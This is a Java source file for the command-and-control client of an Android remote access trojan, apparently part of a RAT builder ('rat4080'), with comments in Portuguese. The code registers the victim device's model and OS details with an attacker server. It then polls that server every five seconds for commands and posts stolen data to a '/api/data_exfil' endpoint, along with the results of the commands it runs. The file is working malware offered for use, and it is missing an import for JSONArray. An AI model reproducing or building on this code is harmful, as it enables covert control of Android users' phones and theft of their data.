package com.rat4080.trojan;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Cliente WebSocket para comunicação com o servidor C2
 * Implementa protocolo simples sobre TCP quando WebSocket não disponível
 */
public class C2Client {
    
    private static final String TAG = "Rat4080C2";
    private static final String C2_URL = "ws://10.0.0.1:5000"; // Substituído pelo gerador
    
    private Context context;
    private String deviceId;
    private C2Listener listener;
    private AtomicBoolean running;
    private Thread connectionThread;
    
    public interface C2Listener {
        void onCommandReceived(JSONObject command);
        void onConnected();
        void onDisconnected();
    }
    
    public C2Client(Context context, String deviceId, C2Listener listener) {
        this.context = context;
        this.deviceId = deviceId;
        this.listener = listener;
        this.running = new AtomicBoolean(false);
    }
    
    public void connect() {
        if (running.get()) return;
        running.set(true);
        
        connectionThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // Implementação WebSocket simplificada
                    URI uri = new URI(C2_URL.replace("ws://", "http://"));
                    URL url = new URL(uri.toString() + "/api/device_connect");
                    
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);
                    
                    // Dados de registo
                    JSONObject registerData = new JSONObject();
                    registerData.put("device_id", deviceId);
                    registerData.put("model", android.os.Build.MODEL);
                    registerData.put("android_version", android.os.Build.VERSION.RELEASE);
                    registerData.put("manufacturer", android.os.Build.MANUFACTURER);
                    
                    OutputStream os = conn.getOutputStream();
                    os.write(registerData.toString().getBytes());
                    os.flush();
                    os.close();
                    
                    int responseCode = conn.getResponseCode();
                    if (responseCode == 200) {
                        listener.onConnected();
                        // Lê comandos pendentes
                        BufferedReader reader = new BufferedReader(
                            new InputStreamReader(conn.getInputStream())
                        );
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            response.append(line);
                        }
                        reader.close();
                        
                        // Processa resposta se contiver comandos
                        processResponse(response.toString());
                    }
                    
                    conn.disconnect();
                    
                    // Polling a cada 5 segundos
                    Thread.sleep(5000);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Erro de ligação: " + e.getMessage());
                    listener.onDisconnected();
                    try {
                        Thread.sleep(10000);
                    } catch (InterruptedException ie) {
                        break;
                    }
                }
            }
        });
        
        connectionThread.start();
    }
    
    private void processResponse(String response) {
        try {
            JSONObject json = new JSONObject(response);
            if (json.has("commands")) {
                JSONArray commands = json.getJSONArray("commands");
                for (int i = 0; i < commands.length(); i++) {
                    JSONObject command = commands.getJSONObject(i);
                    listener.onCommandReceived(command);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar resposta: " + e.getMessage());
        }
    }
    
    public void sendData(String dataType, JSONObject content) {
        try {
            URI uri = new URI(C2_URL.replace("ws://", "http://"));
            URL url = new URL(uri.toString() + "/api/data_exfil");
            
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("data_type", dataType);
            payload.put("content", content);
            
            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar dados: " + e.getMessage());
        }
    }
    
    public void sendCommandResult(int commandId, JSONObject result) {
        try {
            URI uri = new URI(C2_URL.replace("ws://", "http://"));
            URL url = new URL(uri.toString() + "/api/command_result");
            
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JSONObject payload = new JSONObject();
            payload.put("device_id", deviceId);
            payload.put("command_id", commandId);
            payload.put("result", result);
            
            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar resultado: " + e.getMessage());
        }
    }
    
    public void disconnect() {
        running.set(false);
        if (connectionThread != null) {
            connectionThread.interrupt();
        }
    }
}
